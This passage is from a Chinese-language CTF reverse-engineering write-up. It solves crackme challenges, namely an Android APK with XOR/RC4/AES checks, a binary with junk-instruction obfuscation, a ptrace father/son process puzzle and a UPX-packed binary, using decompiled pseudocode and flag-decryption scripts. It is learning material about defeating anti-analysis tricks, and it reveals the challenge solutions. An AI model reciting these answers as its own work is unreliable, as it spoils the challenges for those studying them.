<code>AES</code> 加密，密钥是 <code>MainActivity</code> 的 <code>title</code></p><p><code>doEncCheck</code> 函数进行加密数据检查，发现有 <code>native</code> 关键字，在 Java 中，<code>native </code>关键字用于声明一个方法是由本地代码（通常是C或C++）实现的，所以说明函数是 C&#x2F;C++ 编写的，所以主体在 so 文件，进行 so 提取</p><p><img src="https://img.dkdun.cn/v1/2024/12/f133efd830a5c77f.png"></p><p>IDA 打开 so 文件，找到 <code>doEncCheck</code> ，点进去查看</p><p><img src="https://img.dkdun.cn/v1/2024/12/89a3916d618ae9df.png"></p><p><code>enc</code> 函数的加密伪代码</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">__int64 __fastcall enc(char *<span class="hljs-built_in">a1</span>)<br>&#123;<br>  int i<span class="hljs-comment">; // [rsp+0h] [rbp-20h]</span><br>  int v3<span class="hljs-comment">; // [rsp+4h] [rbp-1Ch]</span><br><br>  v3 = __strlen_chk(<span class="hljs-built_in">a1</span>, -<span class="hljs-number">1</span>LL);<br>  for ( i = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; v3; ++i )</span><br>    <span class="hljs-built_in">a1</span>[i] ^= <span class="hljs-keyword">xork[i </span>% <span class="hljs-number">4</span>];<br>  return encc(<span class="hljs-keyword">xork, </span><span class="hljs-built_in">a1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>又看见一个 <code>encc</code> 加密函数，（太好了，又有个算法加密，我们有救了!）</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs smali">__int64 __fastcall encc(char *a1, char *a2)<br>&#123;<br>  unsigned __int64 v2; // rcx<br>  __int64 result; // rax<br>  unsigned __int8 v4; // [rsp+Ch] [rbp-34h]<br> <span class="hljs-built_in"> int </span>v5; // [rsp+14h] [rbp-2Ch]<br> <span class="hljs-built_in"> int </span>v6; // [rsp+18h] [rbp-28h]<br> <span class="hljs-built_in"> int </span>i; // [rsp+1Ch] [rbp-24h]<br><br>  init_sbox(a1);<br>  v5 = 0;<br>  v6 = 0;<br>  for ( i = 0; ; ++i )<br>  &#123;<br>    v2 = __strlen_chk(a2, -1<span class="hljs-class">LL);</span><br>    result = i;<br>   <span class="hljs-built_in"> if </span>( i &gt;= v2 )<br>      break;<br>    v6 = (v6 + 1) % 256;<br>    v5 = (sbox[v6] + v5) % 256;<br>    v4 = sbox[v6];<br>    sbox[v6] = sbox[v5];<br>    sbox[v5] = v4;<br>    a2[i] ^= sbox[(sbox[v5] + sbox[v6]) % 256];<br>  &#125;<br> <span class="hljs-built_in"> return </span>result;<br>&#125;<br></code></pre></td></tr></table></figure><p>一个异或，一个 RC4 加密，找到了异或的字符串 “meow” 和要解密的数据</p><p><img src="https://img.dkdun.cn/v1/2024/12/924ab39eead959c4.png"></p><p>解密流程：RC4-&gt;异或-&gt;Base64-&gt;AES</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">char</span> sbox[<span class="hljs-number">257</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">char</span> xork[] = <span class="hljs-string">&quot;meow&quot;</span>;<br><span class="hljs-comment">//s盒</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_sbox</span><span class="hljs-params">(<span class="hljs-type">char</span>*a1)</span>&#123;<br>  <span class="hljs-type">int</span> i,j,k,tmp;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span>; i++ )<br>    sbox[i] = i;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span>; i++ )<br>  &#123;<br>    tmp = sbox[i];<br>    j = (a1[k] + tmp + j) % <span class="hljs-number">256</span>;<br>    sbox[i] = sbox[j];<br>    sbox[j] = tmp;<br>    <span class="hljs-keyword">if</span> ( ++k &gt;= <span class="hljs-built_in">strlen</span>(a1))<br>      k = <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">//解密 RC4</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">encc</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1,<span class="hljs-type">char</span>*data)</span>&#123;<br>  init_sbox(a1);<br>  <span class="hljs-type">int</span> i,j,k,tmp;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">strlen</span>(data) ; i++ )<br>  &#123;<br>    j = (j + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>    k = (sbox[j] + k) % <span class="hljs-number">256</span>;<br>    tmp = sbox[j];<br>    sbox[j] = sbox[k];<br>    sbox[k] = tmp;<br>    data[i] ^= sbox[(sbox[j] + sbox[k]) % <span class="hljs-number">256</span>];<br>  &#125;<br>&#125;<br><span class="hljs-comment">//异或</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">enc</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1)</span>&#123;<br><span class="hljs-type">int</span> i;<br>    <span class="hljs-type">int</span> len=<span class="hljs-built_in">strlen</span>(a1);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; len; ++i )<br>    a1[i] ^= xork[i % <span class="hljs-number">4</span>];<br>  encc(xork, a1);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">char</span> mm[]=&#123;<span class="hljs-number">0xC2</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x81</span>, <br>  <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x04</span>,<br>  <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x3D</span>,<br>  <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x5D</span>&#125;;<br>  enc(mm);<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">44</span>;i++)&#123;<br>    <span class="hljs-built_in">putchar</span>(mm[i]);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>AES 密钥是&#96;&#96;MainActivity.title&#96; 也就是 “IamEzEncryptGame” ，厨子梭出来</p><p><img src="https://img.dkdun.cn/v1/2024/12/9fbf4e8780ac5eba.png"></p><h1 id="Dirty-flowers"><a href="#Dirty-flowers" class="headerlink" title="Dirty_flowers"></a>Dirty_flowers</h1><p>不能 f5，有花指令，那就按下 space 键看文本流程，直接将 push-pop 的指令也就是 <code>0x4012f1~0x401302</code> 的指令全部 nop 掉 ,然后在 <code>main</code> 函数头按下 U 和 P 重新编译</p><p><img src="https://img.dkdun.cn/v1/2024/12/80a38a07ee4a66f3.png"></p><p>伪代码大概流程：输入 36 长度字符串，进入 <code>sub_401100</code> 加密，再与 <code>sub_4011D0</code> 判断</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(v4) == <span class="hljs-number">36</span> )<br>  &#123;<br>    sub_401100(v4, <span class="hljs-number">36</span>);<br>    <span class="hljs-keyword">if</span> ( sub_4011D0(v4, <span class="hljs-number">36</span>) )<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;success!\n&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;no!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong length!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br></code></pre></td></tr></table></figure><p><code>sub_401100</code> 也有花指令，和上面的一样流程来去花</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">signed</span> <span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_401100</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// kr00_4</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+1Ch] [ebp-1Ch]</span><br>  <span class="hljs-type">char</span> v5[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [esp+24h] [ebp-14h] BYREF</span><br><br>  <span class="hljs-built_in">strcpy</span>(v5, <span class="hljs-string">&quot;dirty_flower&quot;</span>);<br>  v2 = <span class="hljs-built_in">strlen</span>(v5);<br>  result = v2;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; a2; ++i )<br>  &#123;<br>    result = i + a1;<br>    *(_BYTE *)(i + a1) ^= v5[i % v2];<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>sub_4011D0</code> 函数比较内容大概是：（我比较喜欢看汇编流程图，感觉比伪代码更方便 :) 嘻嘻）</p><p><img src="https://img.dkdun.cn/v1/2024/12/ba83c2581a55c526.png"></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">enc = [<span class="hljs-number">0x02</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x43</span>,<br>       <span class="hljs-number">0x07</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x32</span>,<br>       <span class="hljs-number">0x55</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x00</span>]<br><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;dirty_flower&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    enc[i] ^= <span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i % <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)])<br>    flag += <span class="hljs-built_in">chr</span>(enc[i])<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h1 id="Ptrace"><a href="#Ptrace" class="headerlink" title="Ptrace"></a>Ptrace</h1><p>ida 居然还能反编译<code>.txt</code> ，真的是 tql。第一次见这种类型的题目，看 wp 理解了半天，复现了俩小时（</p><p>记得将 <code>son.txt</code> 和 <code>father.txt</code> 放在同一目录下，打开 <code>father.txt</code>  文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp-14h] [ebp-30h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp-10h] [ebp-2Ch]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp-Ch] [ebp-28h]</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [esp-8h] [ebp-24h]</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [esp-4h] [ebp-20h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> **v9; <span class="hljs-comment">// [esp+0h] [ebp-1Ch]</span><br>  <span class="hljs-type">char</span> stat_loc[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-14h] BYREF</span><br>  <span class="hljs-type">__pid_t</span> v11; <span class="hljs-comment">// [esp+Ch] [ebp-10h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [esp+10h] [ebp-Ch]</span><br>  <span class="hljs-type">int</span> *p_argc; <span class="hljs-comment">// [esp+14h] [ebp-8h]</span><br><br>  p_argc = &amp;argc;<br>  v9 = argv;<br>  v12 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input your flag:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%32s&quot;</span>, &amp;s, v4, v5, v6, v7, v8, v9);<br>  v11 = fork();<span class="hljs-comment">// 创建子进程</span><br>  <span class="hljs-keyword">if</span> ( v11 )<br>  &#123;<span class="hljs-comment">//父进程</span><br>    <span class="hljs-keyword">if</span> ( v11 &lt;= <span class="hljs-number">0</span> )<br>    &#123;<br>      perror(<span class="hljs-string">&quot;fork&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    wait(stat_loc);<br>    ptrace(PTRACE_POKEDATA, addr, addr, <span class="hljs-number">3</span>);<br>    ptrace(PTRACE_CONT, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    wait(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<span class="hljs-comment">//子进程</span><br>    ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    execl(<span class="hljs-string">&quot;./son&quot;</span>, <span class="hljs-string">&quot;son&quot;</span>, &amp;s, <span class="hljs-number">0</span>); <span class="hljs-comment">//把 s 作为新进程的参数</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于<code>fork()</code>、<code>execl()</code> 函数：都是 Linux 中的进程控制函数</p><p><code>fork()</code>：创建新的进程，该进程几乎相当于当前进程的一个完全拷贝</p><p><code>execl()</code>：是函数族 <code>exec()</code> 之一，用来启动另外的进程以取代当前运行的进程</p><p><code>execl()</code> 四个参数</p><table><thead><tr><th>参数</th><th>变量类型</th><th>解释</th></tr></thead><tbody><tr><td>绝对路径</td><td>const char*</td><td>文件存储路径</td></tr><tr><td>标识符</td><td>const char*</td><td>大多数时候是文件名</td></tr><tr><td>参数</td><td>——</td><td>选项</td></tr><tr><td>NULL</td><td>——</td><td>NULL</td></tr></tbody></table><p>所以 <code>main()</code> 函数中流程：<code>fork()</code> 创建子进程，返回的 <code>pid</code> 就是 <code>v11</code>，<code>v11</code>&gt;0 为父进程，<code>v11=0</code> 为子进程，子进程中使用了 <code>execl()</code> 函数，启动当前目录下的 <code>son</code> 文件，传入 <code>s</code> 作为新进程的参数，这里的新进程替换掉之前的子进程，使自己变成子进程。</p><p>打开 <code>son.txt</code> 查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_600011AD</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+2h] [ebp-28h]</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> j; <span class="hljs-comment">// [esp+6h] [ebp-24h]</span><br>  <span class="hljs-type">char</span> *s; <span class="hljs-comment">// [esp+Ah] [ebp-20h]</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp+Eh] [ebp-1Ch]</span><br><br>  s = *(<span class="hljs-type">char</span> **)(a2 + <span class="hljs-number">4</span>);<br>  v6 = <span class="hljs-built_in">strlen</span>(s);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v6; ++i )<br>    byte_60004080[i] = ((<span class="hljs-type">int</span>)(<span class="hljs-type">unsigned</span> __int8)s[i] &gt;&gt; dword_60004040) | (s[i] &lt;&lt; (<span class="hljs-number">8</span> - dword_60004040));<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; v6; ++j )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( byte_60004080[j] != byte_60004020[j] )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is Wrong~&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is right~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 <code>s = *(char **)(a2 + 4)</code>，其实它就是指向 <code>father</code> 传入的 <code>s</code>。<code>execl</code> 执行的命令为 <code>./son s</code>，而对于 <code>son</code> 文件的主函数而言，第一个参数是 <code>a1</code> 表示执行命令参数的个数，这里就是 2，而后面的 <code>a2</code> 真实类型为 <code>const char*</code>，代表的就是命令的各个参数，所以这里的 <code>a2 + 4</code> 执行的就是第二个参数，也就是 <code>s</code>.</p><p><img src="https://img.dkdun.cn/v1/2024/12/d178e014557fc4c8.png"></p><p>大概流程为：将 <code>s</code> 中的每个字节循环移位来进行变化，最后与密文进行比较</p><p>对于 <code>father</code> 文件的 <code>ptarce</code>，<code>ptrace</code> 是用于进程跟踪的，它提供了父进程可以观察和控制其子进程执行的能力，并允许父进程检查和替换子进程的内核镜像(包括寄存器)的值。其基本原理是: 当使用了<code>ptrace</code>跟踪后，所有发送给被跟踪的子进程的信号(除了<code>SIGKILL</code>)，都会被转发给父进程，而子进程则会被阻塞，这时子进程的状态就会被系统标注为<code>TASK_TRACED</code>。而父进程收到信号后，就可以对停止下来的子进程进行检查和修改，然后让子进程继续运行。   </p><p>而这里查看子进程，可以发现使用 <code>ptrace(PTRACE_TRACEME, 0, 0, 0);</code>，它就是允许父进程对自身进行调试的语句，然后在父进程中，使用  <code>PTRACE_POKEDATA</code>  对数据进行修改，然后使用  <code>PTRACE_CONT</code>  让子进程继续执行。因此我们要关注的就是父进程对子进程的什么数据进行了修改</p><p>我们能看到有语句<code>ptrace(PTRACE_POKEDATA, addr, addr, 3);</code>，就是将 <code>addr</code> 所指向的地址进行了数据修改，更改为了 <code>3</code>，点进去 <code>addr</code> 指向的就是 <code>0x60004040</code> 位置的数据</p><p><img src="https://img.dkdun.cn/v1/2024/12/671a98df4e205869.png"></p><p>这个地址在 <code>son</code> 文件中也出现了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v6; ++i )<br>  byte_60004080[i] = ((<span class="hljs-type">int</span>)(<span class="hljs-type">unsigned</span> __int8)s[i] &gt;&gt; dword_60004040) | (s[i] &lt;&lt; (<span class="hljs-number">8</span> - dword_60004040));<br></code></pre></td></tr></table></figure><p>所以这个 <code>ptrace</code> 修改的是偏移值，将 4 改为了 3</p><p><img src="https://img.dkdun.cn/v1/2024/12/8470274afc084d5c.png"></p><p>因此，按照偏移 3 进行逆向变换，脚本</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">enc = [<span class="hljs-number">0xCC</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xED</span>,<br>       <span class="hljs-number">0xAE</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x6D</span>,<br>       <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xAC</span>,<br>       <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xAF</span>]<br>for i <span class="hljs-keyword">in</span> range(len(enc)):<br>    enc[i] = (enc[i] &lt;&lt; <span class="hljs-number">3</span> | enc[i] &gt;&gt; <span class="hljs-number">5</span>)&amp;<span class="hljs-number">0xff</span><br>    print(chr(enc[i]), end=<span class="hljs-string">&#x27;&#x27;)</span><br></code></pre></td></tr></table></figure><h1 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h1><p>看了下 wp 需要脱壳，但是我拿到的附件已经是脱好壳的了，所以直接看伪代码</p><p>一般进行 upx 脱壳方法</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">upx</span> -d <span class="hljs-string">&quot;文件路径&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> status; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input your flag:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%22s&quot;</span>, s);<br>  RC4(s, key);<br>  <span class="hljs-keyword">for</span> ( status = <span class="hljs-number">0</span>; status &lt;= <span class="hljs-number">21</span>; ++status )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( s[status] != data[status] )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is Wrong~&quot;</span>);<br>      <span 